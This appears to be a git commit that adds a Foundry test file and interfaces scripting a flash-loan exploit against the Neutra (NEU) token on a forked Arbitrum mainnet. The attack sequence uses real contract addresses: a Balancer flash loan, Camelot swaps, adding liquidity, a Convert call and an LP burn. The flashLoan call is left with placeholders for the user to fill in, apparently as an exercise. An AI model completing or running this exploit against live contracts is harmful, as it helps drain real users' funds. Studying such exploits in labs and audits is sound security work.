2d3aa3cab507dfe062aaa24514418d5b7542c57f
cryptostaker2 <nftstaker@gmail.com>
2023-08-18 07:11:11 +0800

    added incomplete test file

---
+++ test/Neutra.t.sol
@@ -0,0 +1,152 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.10;
+
+import "forge-std/Test.sol";
+import "./interface.sol";
+
+contract NeutraTest is Test {
+    IERC20 WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
+    IERC20 NEU = IERC20(0xdA51015b73cE11F77A115Bb1b8a7049e02dDEcf0);
+    IERC20 NEU2 = IERC20(0x6609BE1547166D1C4605F3A243FDCFf467e600C3);
+    IBalancerVault Balancer =
+        IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
+    ICamelotRouter Camelot =
+        ICamelotRouter(0xc873fEcbd354f5A56E00E710B90EF4201db2448d);
+    ICamelotPair Pair =
+        ICamelotPair(0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440);
+    ICamelotPair Pair2 =
+        ICamelotPair(0x2ea3CA79413C2EC4C1893D5f8C34C16acB2288A4);
+    IConvert Convert = IConvert(0xdbd3d6040f87A9F822839Cb31195Ad25C2D0D54d);
+
+    function setUp() public {
+        vm.createSelectFork("https://rpc.ankr.com/arbitrum", 117189100);
+        vm.label(address(WETH), "WETH");
+        vm.label(address(NEU), "NEU");
+        vm.label(address(Camelot), "Camelot Router");
+    }
+
+    function testExploit() public {
+        WETH.approve(address(Camelot), type(uint256).max);
+        NEU.approve(address(Camelot), type(uint256).max);
+
+        console.log(
+            "Attacker WETH Balance at start:",
+            WETH.balanceOf(address(this))
+        );
+
+        flashBalancer();
+
+        console.log(
+            "Attacker WETH Balance at end:",
+            WETH.balanceOf(address(this))/1e18
+        );
+    }
+
+    function receiveFlashLoan(
+        address[] memory tokens,
+        uint256[] memory amounts,
+        uint256[] memory feeAmounts,
+        bytes memory userData
+    ) external {
+        console.log(
+            "Attacker WETH Balance after flashloan:",
+            WETH.balanceOf(address(this))
+        );
+        address[] memory path = new address[](2);
+        path[0] = address(WETH);
+        path[1] = address(NEU);
+        Camelot.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+            0.15 ether,
+            0,
+            path,
+            address(this),
+            address(this),
+            block.timestamp + 1000
+        );
+        console.log("------------------------------");
+        console.log("Swap successful, [WETH -> NEU]");
+        uint neuAmount = NEU.balanceOf(address(this));
+        console.log("Balance of WETH:", WETH.balanceOf(address(this)) / 1e18);
+        console.log("Balance of NEU:", neuAmount / 1e18);
+        console.log("------------------------------");
+        Camelot.addLiquidity(
+            address(WETH),
+            address(NEU),
+            0.15 ether,
+            neuAmount,
+            0,
+            0,
+            address(this),
+            block.timestamp + 1000
+        );
+        uint lpAmount = Pair.balanceOf(address(this));
+        console.log("Liquidity Added:", lpAmount/1e18);
+        Pair.approve(address(Convert), type(uint256).max);
+        console.log("Pair approved");
+        Camelot.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+            849 ether,
+            0,
+            path,
+            address(this),
+            address(this),
+            block.timestamp + 1000
+        );
+        neuAmount = NEU.balanceOf(address(this));
+        console.log("------------------------------");
+        console.log("Swap successful, [WETH -> NEU]");
+        console.log("Balance of WETH:", WETH.balanceOf(address(this)) / 1e18);
+        console.log("Balance of NEU:", neuAmount / 1e18);
+        console.log("------------------------------");
+        Convert.convert(lpAmount);
+        console.log("Convert successful");
+        console.log("Liquidity Left:", lpAmount);
+        // address[] memory path2 = new address[](2);
+        path[0] = address(NEU);
+        path[1] = address(WETH);
+        console.log("Attacker NEU balance:", neuAmount);
+        Camelot.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+            neuAmount,
+            0,
+            path,
+            address(this),
+            address(this),
+            block.timestamp + 1000
+        );
+        neuAmount = NEU.balanceOf(address(this));
+        console.log("------------------------------");
+        console.log("Swap successful, [NEU -> WETH]");
+        console.log("Balance of WETH:", WETH.balanceOf(address(this)) / 1e18);
+        console.log("Balance of NEU:", neuAmount / 1e18);
+        console.log("Balance of LP:", Pair2.balanceOf(address(this)));
+        console.log("------------------------------");
+        uint wethAmount = WETH.balanceOf(address(this));
+        Pair2.transfer(address(Pair2), Pair2.balanceOf(address(this)));
+        console.log("Transfer success");
+        (uint amount0, uint amount1) = Pair2.burn(address(this));
+        console.log("Burn success");
+        NEU2.approve(address(Camelot), type(uint256).max);
+        console.log("Approve success");
+        address[] memory path2 = new address[](2);
+        path2[0] = address(NEU2);
+        path2[1] = address(WETH);
+        uint neu2Amount = NEU2.balanceOf(address(this));
+        Camelot.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+            neu2Amount,
+            0,
+            path2,
+            address(this),
+            address(this),
+            block.timestamp + 1000
+        );
+        console.log("Last swap successful");
+        console.log("WETH left before repaying flashloan:",  WETH.balanceOf(address(this)) / 1e18);
+        WETH.transfer(address(Balancer), 1000 ether);
+    }
+
+
+    function flashBalancer() internal {
+        // Code your exploit in the flashBalancer() function.
+        // Replace the following variables a,b,c,d with the appropriate values
+        Balancer.flashLoan(a,b,c,d);
+    }
+}
---
+++ test/interface.sol
@@ -0,0 +1,228 @@
+interface ICamelotRouter {
+    function removeLiquidityETHSupportingFeeOnTransferTokens(
+        address token,
+        uint liquidity,
+        uint amountTokenMin,
+        uint amountETHMin,
+        address to,
+        uint deadline
+    ) external returns (uint amountETH);
+
+    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
+        address token,
+        uint liquidity,
+        uint amountTokenMin,
+        uint amountETHMin,
+        address to,
+        uint deadline,
+        bool approveMax,
+        uint8 v,
+        bytes32 r,
+        bytes32 s
+    ) external returns (uint amountETH);
+
+    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
+        uint amountIn,
+        uint amountOutMin,
+        address[] calldata path,
+        address to,
+        address referrer,
+        uint deadline
+    ) external;
+
+    function swapExactETHForTokensSupportingFeeOnTransferTokens(
+        uint amountOutMin,
+        address[] calldata path,
+        address to,
+        address referrer,
+        uint deadline
+    ) external payable;
+
+    function swapExactTokensForETHSupportingFeeOnTransferTokens(
+        uint amountIn,
+        uint amountOutMin,
+        address[] calldata path,
+        address to,
+        address referrer,
+        uint deadline
+    ) external;
+
+    function addLiquidity(
+        address tokenA,
+        address tokenB,
+        uint amountADesired,
+        uint amountBDesired,
+        uint amountAMin,
+        uint amountBMin,
+        address to,
+        uint deadline
+    ) external returns (uint amountA, uint amountB, uint liquidity);
+}
+
+interface ICamelotPair {
+    event Approval(address indexed owner, address indexed spender, uint value);
+    event Transfer(address indexed from, address indexed to, uint value);
+
+    function name() external pure returns (string memory);
+
+    function symbol() external pure returns (string memory);
+
+    function decimals() external pure returns (uint8);
+
+    function totalSupply() external view returns (uint);
+
+    function balanceOf(address owner) external view returns (uint);
+
+    function allowance(
+        address owner,
+        address spender
+    ) external view returns (uint);
+
+    function approve(address spender, uint value) external returns (bool);
+
+    function transfer(address to, uint value) external returns (bool);
+
+    function transferFrom(
+        address from,
+        address to,
+        uint value
+    ) external returns (bool);
+
+    function DOMAIN_SEPARATOR() external view returns (bytes32);
+
+    function PERMIT_TYPEHASH() external pure returns (bytes32);
+
+    function nonces(address owner) external view returns (uint);
+
+    function permit(
+        address owner,
+        address spender,
+        uint value,
+        uint deadline,
+        uint8 v,
+        bytes32 r,
+        bytes32 s
+    ) external;
+
+    event Mint(address indexed sender, uint amount0, uint amount1);
+    event Burn(
+        address indexed sender,
+        uint amount0,
+        uint amount1,
+        address indexed to
+    );
+    event Swap(
+        address indexed sender,
+        uint amount0In,
+        uint amount1In,
+        uint amount0Out,
+        uint amount1Out,
+        address indexed to
+    );
+    event Sync(uint112 reserve0, uint112 reserve1);
+
+    function MINIMUM_LIQUIDITY() external pure returns (uint);
+
+    function factory() external view returns (address);
+
+    function token0() external view returns (address);
+
+    function token1() external view returns (address);
+
+    function getReserves()
+        external
+        view
+        returns (
+            uint112 reserve0,
+            uint112 reserve1,
+            uint16 token0feePercent,
+            uint16 token1FeePercent
+        );
+
+    function getAmountOut(
+        uint amountIn,
+        address tokenIn
+    ) external view returns (uint);
+
+    function kLast() external view returns (uint);
+
+    function setFeePercent(
+        uint16 token0FeePercent,
+        uint16 token1FeePercent
+    ) external;
+
+    function mint(address to) external returns (uint liquidity);
+
+    function burn(address to) external returns (uint amount0, uint amount1);
+
+    function swap(
+        uint amount0Out,
+        uint amount1Out,
+        address to,
+        bytes calldata data
+    ) external;
+
+    function swap(
+        uint amount0Out,
+        uint amount1Out,
+        address to,
+        bytes calldata data,
+        address referrer
+    ) external;
+
+    function skim(address to) external;
+
+    function sync() external;
+
+    function initialize(address, address) external;
+}
+
+interface IConvert {
+    function setConfigs(address _inputToken, address _outputToken) external;
+
+    function convert(uint256 _amount) external;
+
+    function getAmountOut(uint256 _amount) external returns (uint256);
+
+    function withdrawToken(
+        address _token,
+        address _account,
+        uint256 _amount
+    ) external;
+
+    function pause() external;
+
+    function unpause() external;
+}
+
+interface IERC20 {
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+    event Transfer(address indexed from, address indexed to, uint256 value);
+
+    function name() external view returns (string memory);
+
+    function symbol() external view returns (string memory);
+
+    function decimals() external view returns (uint8);
+
+    function totalSupply() external view returns (uint256);
+
+    function balanceOf(address owner) external view returns (uint256);
+
+    function allowance(address owner, address spender) external view returns (uint256);
+
+    function approve(address spender, uint256 value) external returns (bool);
+
+    function transfer(address to, uint256 value) external returns (bool);
+
+    function transferFrom(address from, address to, uint256 value) external returns (bool);
+    function withdraw(uint256 wad) external;
+    function deposit(uint256 wad) external returns (bool);
+    function owner() external view virtual returns (address);
+}
+
+interface IBalancerVault {
+
+    function flashLoan(address recipient, address[] memory tokens, uint256[] memory amounts, bytes memory userData)
+        external;
+}
